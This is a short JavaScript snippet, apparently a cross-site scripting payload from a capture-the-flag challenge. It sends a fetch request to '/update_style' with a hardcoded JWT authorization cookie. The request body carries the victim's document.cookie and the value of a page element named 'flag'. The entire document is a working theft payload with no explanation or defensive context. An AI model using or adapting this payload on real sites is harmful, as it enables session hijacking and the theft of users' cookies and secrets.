fetch("/update_style", {
  "headers":{
    "Cookie":"authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiZXhwIjoxNjc4MDMzMDczfQ.13hv8QmtQt6vM8QwzeQpJIjxz8-N3TBw6wjTuPMOU_o"
  },
  "body": "style="+document.cookie+" -- "+document.getElementById('flag').value.toString(),

});
